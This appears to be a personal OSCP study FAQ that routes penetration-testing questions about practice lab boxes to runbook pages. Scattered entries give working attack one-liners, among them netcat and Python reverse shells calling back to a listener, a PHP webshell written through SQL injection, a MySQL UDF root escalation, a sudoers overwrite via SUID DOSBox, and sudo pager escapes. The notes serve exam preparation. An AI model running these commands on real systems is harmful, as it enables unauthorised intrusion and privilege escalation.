# FAQ — Quick Answers
> This cue is a compact reminder. For the full workflow, see [[RUNBOOK V2/Index]].
## Related RUNBOOK V2 stages

- [[RUNBOOK V2/Linux - Web Enum]]

*One-line answers + a link. Not here to explain, here to route.*

---

## Ground Rules (read this first)

**No Metasploit for initial exploitation during OSCP practice.** Manual techniques only unless the module explicitly teaches MSF. Same for sqlmap, learn the injection by hand first.

**Ask twice rule.** If you're stuck and ask how to proceed:
- First answer = which module or stage note to check.
- Second ask = actual technique walkthrough.
This is intentional. The goal is to make the module knowledge stick, not to be handed steps.

**When to take a screenshot:** [[OSCP Habits - Screenshot & Loot]] has the full checklist. The short version: any time something *works*, screenshot it before moving on.

**When to store loot:** immediately on finding it, creds, hashes, keys, flags. Don't rely on terminal history.

---

## Discovery

### "I've got open ports, what now?"
→ [[RUNBOOK V2/Port Triage|Port Scan - Results Triage]], triage by service, then pick a lane

### "Nmap is taking forever"
→ `nmap -p- --min-rate 10000 $BoxIP` first pass, then `-sC -sV -p <ports>` on what comes back

### "I can see a web port, where do I start?"
→ [[RUNBOOK V2/Linux - Web Enum|HTTP - Initial Recon]], browser first, then dir brute

### "I only see one open port and it's not obvious"
→ [[RUNBOOK V2/Port Triage|Port Scan - Results Triage]], add UDP: `sudo nmap -sU --top-ports 20 $BoxIP`

### "How do I know what version something is running?"
→ `nmap -sV` on the port, then searchsploit or [HackTricks](https://book.hacktricks.xyz) for that service + version

---

## Footprinting

### "SMB is open, what can I do without creds?"
→ [[RUNBOOK V2/Windows - SMB Enum|SMB - Null Session]], null session listing first

### "FTP is open, worth trying?"
→ [[RUNBOOK V2/Linux - FTP Enumeration|FTP - Anonymous]], anonymous login first, always

### "There's a web app — how do I find the hidden stuff?"
→ [[RUNBOOK V2/Linux - Web Enum|HTTP - Directory Brute]], run a dir brute, recurse into anything that returns 200/301

### "I think it's running WordPress / Joomla / Drupal"
→ [[RUNBOOK V2/Linux - CMS Check|HTTP - CMS Detection]], check `/wp-login.php`, `wpscan`, `droopescan`

### "There are vhosts / subdomains — how do I find them?"
→ [[RUNBOOK V2/Web - Virtual Host Enumeration|HTTP - Subdomain Enum]] ← [[06. Information Gathering|Information Gathering]]

---

## Foothold

### "I've got a shell but it's rubbish, how do I make it not rubbish?"
→ [[RUNBOOK V2/Linux - Shell Stabilise|Shell - Upgrade]], `python3 -c 'import pty;pty.spawn("/bin/bash")'` → Ctrl+Z → `stty raw -echo; fg`

### "I've got creds but nowhere obvious to use them"
→ [[RUNBOOK V2/Port Triage|Port Scan - Results Triage]], spray across SSH, SMB, RDP, WinRM, HTTP login forms

### "I found a file upload, can I get a shell from it?"
→ [[RUNBOOK V2/Linux - File Upload|Foothold - File Upload]], check what extensions are blocked and where files land

### "I found what looks like command injection"
→ [[RUNBOOK V2/Linux - Command Injection|Web App - Command Injection]], test with `; id`, `| id`, `&& id`, backticks

### "The box has a CVE — where do I start?"
→ [[13. Locating Public Exploits|Locating Public Exploits]], `searchsploit`, GitHub, [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings). Read the exploit before running it.

---

## PrivEsc

### "I'm on Linux, where do I even start?"
→ [[RUNBOOK V2/Linux - Local Enum|PrivEsc Linux - Initial Enum]], `linpeas.sh` first, then `sudo -l`, SUID, cron

### "I'm on Windows, where do I even start?"
→ [[RUNBOOK V2/Windows - Privilege Triage|PrivEsc Windows - Initial Enum]], `winPEAS.exe` first, then services, scheduled tasks, unquoted paths

### "sudo -l shows something but I don't know what to do with it"
→ [GTFOBins](https://gtfobins.github.io), search the binary, pick the `sudo` section

### "I can see a service running as SYSTEM/root"
→ [[RUNBOOK V2/Windows - Service Abuse|PrivEsc Windows - Services]] or [[RUNBOOK V2/Linux - Local Enum|PrivEsc Linux - Writable Config]], is the binary or config writable?

### "There's a cronjob / scheduled task"
→ [[RUNBOOK V2/Linux - Cron Check|PrivEsc Linux - Cron]] / [[RUNBOOK V2/Windows - Scheduled Task Abuse|PrivEsc Windows - Scheduled Tasks]], can you write the target script/binary?

### "I've got a hash, how do I use it?"
→ [[16. Password Attacks|Password Attacks]], crack with hashcat (identify type with hash-identifier first) or pass-the-hash if NTLM

---

## Web App

### "There's a login form"
→ Try `admin:admin`, `admin:password`, `admin:$BoxName` first, then [[RUNBOOK V2/Linux - SQLi|Web App - SQLi]] for bypass

### "I think it's LFI"
→ [[RUNBOOK V2/Linux - LFI|Web App - LFI]], start with `../../../etc/passwd`, escalate to log poisoning or PHP wrappers

### "LFI returned a long encoded backup"
→ Save the raw response first, strip only the known banner or wrapper lines, decode in a bounded loop, and write the result to private loot. Validate it once against the identified service without printing the credential in notes or screenshots. See [[OSCP/BOXES/WRITE UPS/Linux/Poison|Poison]]

### "SSH access shows a service only on 127.0.0.1"
→ Recheck listeners with the target-native tool (`netstat -an` on FreeBSD), identify the process and exact port, then use `ssh -N -L $TunnelPort:127.0.0.1:$RemotePort $Username@$BoxIP -f` and verify the Kali-side listener before using the client. See [[OSCP/BOXES/WRITE UPS/Linux/Poison|Poison]]

### "I think it's SQLi — where do I inject?"
→ [[RUNBOOK V2/Linux - SQLi|Web App - SQLi]], test manually with `'`, `"`, `'--`, `1=1--` before anything else

### "The app is making outbound requests to something I control"
→ [[Web Applications (Decision Tree)|Web App - SSRF]], probe `http://127.0.0.1:PORT`, internal services, cloud metadata endpoint

### "I need to encode/decode/transform something weird"
→ [CyberChef](https://gchq.github.io/CyberChef/), it does everything

---

## Troubleshooting

### "My reverse shell won't connect back"
→ Confirm `$LocalIP` is `tun0` not `eth0`, listener is up, try port 443 or 80 if egress is filtered

### "The exploit reports success but no shell arrives"
→ Test RCE separately first: use `ping -c 4 $LocalIP` as your CMD and watch `tcpdump -i tun0 icmp` on Kali. If ping arrives → RCE works, the issue is egress filtering or the wrong binary. Try port 80/443 for callback. If the binary in your payload is `python3`, try `python` instead — the delivery process PATH may only have Python 2.

### "My payload gives a 553 error on SMTP exploitation"
→ The SMTP MAIL FROM parser rejects `=`, `/`, and `+` inside `<;CMD;>`. Standard base64 uses all three — it won't work. Use a direct `python -c "..."` payload with `\"` for inner string delimiters instead of base64 encoding.

### "The exploit runs but nothing happens"
→ Check architecture (x86 vs x64), check AV/defender, try a different payload type, [RevShells](https://www.revshells.com) for alternatives

### "I can't transfer a file to the target"
→ [[17. Windows Privilege Escalation]], python HTTP server + curl/wget/iwr, or base64 encode it

### "I'm completely stuck and have been on this for a while"
→ Back to [[RUNBOOK V2/Port Triage|Port Scan - Results Triage]], missed port? missed vhost? missed parameter? check [ippsec.rocks](https://ippsec.rocks) for the box name or a technique keyword

### "Port 80 root just returns a blank page / placeholder — is there anything there?"
→ Yes, always dir bust it. `gobuster dir -u http://$BoxIP/ -w /usr/share/wordlists/dirb/common.txt` — apps are frequently installed under subdirectories (`/test/`, `/wordpress/`, `/admin/`). A blank root does not mean an empty server. See [[RUNBOOK V2/Linux - Web Enum|HTTP - Directory Brute]].

### "The page source has version info in it — is that useful?"
→ Yes. Always `curl -s http://$URL | grep -i "version\|powered by\|generator"` and check the HTML comments at the bottom of the page. Developers leave version strings in comments constantly. That version feeds directly into searchsploit.

### "I have a kernel version from `uname -a` — how do I find the right exploit?"
→ 1) Broad search: `searchsploit linux kernel <major.minor>`. 2) Google: `"linux <version> local privilege escalation"`. 3) Specific keyword search: `searchsploit rds kernel`, `searchsploit dirty cow`, etc. "RDS" and "Dirty COW" aren't obvious cold — research is the step between `uname -a` and the exploit. See [[RUNBOOK V2/Linux - Kernel Exploit|PrivEsc Linux - Kernel]].

### "There's a PostgreSQL port open — what's the first thing to try?"
→ `psql -h $BoxIP -p $Port -U postgres` with password `postgres`. If that fails try blank password or `$BoxName`. Then `SELECT current_setting('is_superuser');` to confirm superuser before attempting COPY TO PROGRAM RCE. See [[RUNBOOK V2/Linux - Database Access|PostgreSQL - Initial Access]].

### "COPY TO PROGRAM gives exit code 2 / syntax error"
→ COPY TO PROGRAM runs via `/bin/sh` (dash on Debian), not bash. `>&` and `/dev/tcp` are bash-only and will fail. Use `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc $LocalIP $Port >/tmp/f` instead. If nc fails, try port 80 (egress filtering). See [[RUNBOOK V2/Linux - Database Access|PostgreSQL - COPY TO PROGRAM RCE]].

### "I need to check what tools are on the box but I don't have a shell yet (PostgreSQL)"
→ COPY FROM PROGRAM reads command stdout into a table: `CREATE TABLE t (o text); COPY t FROM PROGRAM 'ls /usr/bin/nc* /usr/bin/python* 2>/dev/null; echo done'; SELECT * FROM t; DROP TABLE t;` — the `; echo done` is critical to force exit code 0 so COPY doesn't bail.

### "I confirmed SQLi but the response doesn't give me data — how do I get a shell?"
→ If stacked queries work and you know the web root, write a webshell: `SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/cmd.php'`. Web root is often leaked in verbose SQL error messages in the response body. See [[RUNBOOK V2/Linux - SQLi|Foothold - SQLi to Shell]].

### "I have MySQL root creds — is there a path to root from MySQL alone?"
→ Yes, if MySQL runs as the root OS user: load the `lib_mysqludf_sys.so` UDF and call `sys_exec('cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash')`, then `/tmp/rootbash -p`. See [[RUNBOOK V2/Linux - Database Access|PrivEsc Linux - UDF]].

### "How do I know if MySQL is running as the root OS user?"
→ `ps aux | grep mysql`. If the process owner in column 1 is `root`, sys_exec commands run as root.

### "I'm testing a LIMIT parameter for SQLi — what's the right syntax?"
→ Numeric context, no quotes needed. Try `LIMIT 1;SELECT SLEEP(5)#` — note the comment `#` at the end to kill the rest of the query. Boolean tricks (`' AND 1=1`) don't apply here. The `time curl ...` wrapper makes timing attacks easy to read.

### "I'm hitting a WordPress plugin upload endpoint but getting HTTP 500"
→ The plugin endpoint likely needs internal POST fields beyond just `file`. For Simple File List 4.2.2: `eeSFL_ID=1`, `eeSFL_FileUploadDir`, `eeSFL_Timestamp`, and `eeSFL_Token` are all required — without them PHP crashes before handling the upload. Get the token from any page that renders the plugin's `[simple-file-list]` shortcode (look for `eeSFL_ActionNonce` in the HTML), or check if the exploit script carries static values. See [[WordPress - Simple File List Upload]].

### "The WordPress plugin rename worked but shell.php is 404"
→ Wrong POST field name or missing headers. Simple File List uses `eeFileOld` (NOT `oldFile`, `eeFilename`, or `eeFile`) for the current filename, `eeListFolder=/` for the folder, and `eeFileAction=Rename|newname.php`. It also requires `X-Requested-With: XMLHttpRequest` and a valid `Referer` header. Inspect the plugin's `ee-footer.js` → `function eeSFL_FileAction` to read the exact AJAX call shape. See [[WordPress - Simple File List Upload]].

### "My mkfifo+nc reverse shell isn't connecting even though ping works and egress is open"
→ PHP's `system()` can silently drop complex piped command chains. Fallback: python3 reverse shell. Confirm Python3 is available (check other services on the box — a Flask app on port 5000 means Python3 is there). Use: `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("$LocalIP",$Port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'`. Pass via `--data-urlencode` to handle the quotes.

### "dosbox is SUID root — how do I exploit it?"
→ DOSBox is a DOS emulator. Its `-c` flag runs DOS commands at startup as the effective user (root, since SUID). Use `mount` to map a Linux directory to a DOS drive, then `echo` with redirection to write files as root: `dosbox -c 'mount c /etc' -c 'echo USER ALL=(ALL) NOPASSWD: ALL > c:\sudoers' -c 'exit'`. ALSA errors are normal (no sound card) — ignore them. Then `sudo -n bash`. Restore sudoers after: `bsdtar -xOf /path/to/sudo-pkg.tar.zst etc/sudoers > /etc/sudoers`. See [[RUNBOOK V2/Linux - SUID Check|PrivEsc Linux - SUID]].

### "Magescan will not run against an old Magento box"
→ Magescan may fail under a current PHP and Composer environment because its legacy dependencies are blocked by security advisories, require older PHP versions, or need the missing PHP curl extension. Preserve the checkout as loot, record the dependency error, and use manual fingerprinting plus `searchsploit Magento` when the CMS and version are already established.

### "The Magento RCE returns HTTP 500 but prints command output"
→ Treat the body as the evidence. Run an identity command first, such as `python3 $BoxDir/exploits/magento_rce_py3.py id`; if it returns `uid=`, the object-injection chain works. A shell callback may keep the PHP request open, so the listener connection or callback timeout is the success signal.

### "Magento login works by browser but not by script"
→ Use the FQDN from the redirect and cookie domain consistently. A session obtained from `swagshop.htb` may not authenticate correctly when subsequent requests are sent to the raw IP. Add the FQDN to `/etc/hosts` and extract the current `form_key` from the login page before posting credentials.

### "Nmap says the TLS service is vulnerable to Heartbleed. What next?"
→ Save the Nmap result, inspect a public proof of concept, and capture output to private loot. Use a bounded repeat loop and search locally for printable candidate material. Do not paste memory captures, key contents, passphrases, or flags into notes or screenshots. See [[OSCP/BOXES/WRITE UPS/Linux/Valentine|Valentine]].

### "An SSH key is exposed as hex or another encoding and OpenSSH rejects it"
→ Decode it into a private loot file, set mode 600, validate it with `ssh-keygen -y`, and then retry SSH with only the legacy algorithm options required by the target. Keep the key and any passphrase private. See [[OSCP/BOXES/WRITE UPS/Linux/Valentine|Valentine]].

### "I found a readable root-owned Unix socket on Linux"
→ Identify the owning process and test whether it is a tmux socket: `tmux -S $TmuxSocket ls`, then attach only after confirming the path and session. Run `id` inside the session to verify the privilege level. See [[OSCP/BOXES/WRITE UPS/Linux/Valentine|Valentine]].

### "Nostromo 1.9.6 is running. What is the shortest verified path?"
→ Review Exploit-DB 47837, repair any local syntax issue, and run `python2 $BoxDir/exploits/nostromo-47837.py $BoxIP $WebPort "id"`. Once RCE is confirmed, read `/var/nostromo/conf/nhttpd.conf`, crack the configured `.htpasswd` record offline, download the protected SSH archive, and crack its key with `ssh2john`. See [[OSCP/BOXES/WRITE UPS/Linux/Traverxec|Traverxec]].

### "Why does generic sudo journalctl fail on Traverxec?"
→ The permission is argument-specific. Read `/home/$Username/bin/server-stats.sh` and reproduce `sudo -n /usr/bin/journalctl -n5 -unostromo.service` exactly. When the pager opens, enter `!/bin/bash`, then confirm `id`. See [[OSCP/BOXES/WRITE UPS/Linux/Traverxec|Traverxec]].

### "Gobuster made the Nostromo service refuse connections"
→ Let the daemon recover, lower concurrency, and continue with `curl` plus the reviewed version-specific exploit. The temporary refusal is a fragile-service response, not evidence that the attack surface vanished. See [[OSCP/BOXES/WRITE UPS/Linux/Traverxec|Traverxec]].
### "The full scan says every port is filtered"

Check the active target variable, tun0, and one ping before changing scan options. A stale target address can produce the same result as a firewall. If the route is healthy, use the TCP-connect Nmap mode and save the rerun. See [[OSCP/BOXES/WRITE UPS/Linux/Shocker|Shocker]].

~~~bash
printf 'Target=%s\nLocal=%s\n' "$BoxIP" "$LocalIP"
ip addr show tun0
ping -c 1 "$BoxIP"
sudo nmap -Pn -n -sT -p- --min-rate 500 "$BoxIP" -oA "$BoxDir/nmap/allports"
~~~

### "The CGI directory returns 403"

A forbidden directory listing does not prove that direct CGI files are forbidden. Enumerate /cgi-bin/ separately with script extensions, then request each useful result directly. If the User-Agent identity proof returns a uid line, open [[OSCP/RUNBOOK V2/Linux - Shellshock CGI|Linux Shellshock CGI]].

### "The Shellshock proof works but the callback does not"

Keep the positive id response as proof. Check the listener, LocalIP, callback port, Bash availability, target egress, and header quoting in that order. The HTTP request may time out after the CGI process attaches to the shell.

### "sudo allows Perl; what should I check?"

Read the exact path and run-as identity first. If sudo permits /usr/bin/perl without a password, use inline evaluation and prove the result:

~~~bash
sudo -n -l
sudo /usr/bin/perl -e 'exec "/bin/bash";'
id
whoami
~~~

Do not substitute a different Perl path or argument pattern. See [[OSCP/RUNBOOK V2/Linux - Sudo Check|Linux Sudo Check]].

### "stty broke my local terminal after a raw callback"

The raw-shell sequence changes local terminal settings. Type reset and press Enter, then restore a normal terminal before continuing:

~~~bash
reset
stty sane
~~~

## External Resources

- [HackTricks - Pentesting Index](https://hacktricks.wiki/en/index.html)
- [PayloadsAllTheThings - Methodology and Resources](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources)
- [RevShells](https://www.revshells.com/) for reverse-shell selection
- [CyberChef](https://gchq.github.io/CyberChef/) for encoding and decoding
- [ippsec.rocks](https://ippsec.rocks/) for practical walkthrough searches
## Why this matters for OSCP

This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
